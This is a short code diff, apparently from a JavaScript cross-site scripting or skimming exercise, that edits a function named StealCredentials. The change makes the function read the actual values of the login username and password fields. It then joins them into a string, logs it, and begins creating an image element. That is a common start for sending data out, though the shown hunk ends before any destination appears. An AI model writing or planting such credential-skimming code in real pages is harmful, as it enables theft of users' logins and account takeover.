@@ -36,8 +36,8 @@
             console.log(document.forms);
             function StealCredentials() {
               console.log("test2");
-                var username = document.getElementById("login_username");
-                var pass = document.getElementById("login_password");
+                var username = document.getElementById("login_username").value;
+                var pass = document.getElementById("login_password").value;
                 var credentials = "username = " + username + " | " + "password = " + pass;
                 console.log(credentials);
                 img = document.createElement("img");
